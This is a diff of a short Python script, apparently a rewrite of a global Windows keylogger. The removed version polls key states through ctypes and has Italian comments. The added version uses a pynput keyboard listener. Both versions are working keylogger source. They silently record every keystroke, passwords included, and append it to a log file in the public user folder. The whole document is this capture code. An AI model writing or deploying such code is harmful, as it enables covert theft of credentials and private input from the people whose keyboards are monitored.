@@ -1,32 +1,18 @@
-import ctypes
-import time
-import sys
+from pynput import keyboard
 
-# Costanti Windows
-user32 = ctypes.windll.user32
-kernel32 = ctypes.windll.kernel32
+log_path = r"C:\Users\Public\global_log.txt"
 
-def main():
-    duration = int(sys.argv[1]) if len(sys.argv) > 1 else 10
-    log_path = r"C:\Users\Public\global_log.txt"
-    start_time = time.time()
-    
+def on_press(key):
+    try:
+        # Handles alphanumeric keys
+        k = key.char
+    except AttributeError:
+        # Handles special keys (Space, Enter, etc.)
+        k = f" [{key}] "
+
     with open(log_path, "a") as f:
-        f.write(f"\n--- Inizio Monitoraggio: {time.ctime()} ---\n")
-        
-        while time.time() - start_time < duration:
-            # Controlla lo stato di ogni tasto (da 8 a 255)
-            for i in range(8, 256):
-                if user32.GetAsyncKeyState(i) & 1:
-                    # Traduzione rudimentale dei tasti
-                    if i == 13: f.write("\n") # INVIO
-                    elif i == 32: f.write(" ") # SPAZIO
-                    elif 64 < i < 91: f.write(chr(i)) # LETTERE
-                    else: f.write(f"[{i}]") # CODICE TASTO
-                    f.flush() # Scrive immediatamente su disco
-            time.sleep(0.01)
-            
-        f.write(f"\n--- Fine Monitoraggio: {time.ctime()} ---\n")
+        f.write(k)
 
-if __name__ == "__main__":
-    main()
+# This sets up a "Listener" (a Windows Hook)
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
